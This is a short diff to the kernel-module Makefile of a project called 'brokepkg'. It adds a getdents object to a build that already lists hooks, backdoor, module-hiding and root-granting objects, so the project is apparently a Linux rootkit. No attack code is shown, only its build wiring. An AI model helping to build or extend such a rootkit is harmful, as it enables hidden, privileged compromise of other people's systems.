@@ -1,5 +1,5 @@
 obj-m := brokepkg.o
-brokepkg-objs := src/main.o src/hooks.o src/backdoor.o src/module_hide.o src/give_root.o
+brokepkg-objs := src/main.o src/hooks.o src/backdoor.o src/module_hide.o src/give_root.o src/getdents.o
 SHELL := $(shell which bash)
 CC := gcc
 KDIR := /lib/modules/$(shell uname -r)/build
